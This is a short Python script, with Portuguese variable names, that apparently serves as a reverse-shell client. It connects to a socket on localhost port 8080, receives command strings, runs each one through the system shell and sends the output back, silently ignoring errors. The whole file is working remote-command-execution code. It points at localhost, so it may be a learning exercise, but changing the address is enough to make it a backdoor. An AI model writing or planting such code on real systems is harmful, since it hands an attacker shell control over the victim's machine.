import socket, subprocess

cliente = socket.socket()
try:
  cliente.connect(('localhost', 8080))
  cliente.send('1'.encode('ascii'))

  while True:
    comandoBytes = cliente.recv(1024)
    comandoCodificado = comandoBytes.decode('ascii')
    comando = subprocess.Popen(comandoCodificado, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    cliente.send(comando.stdout.read())

except:
  pass
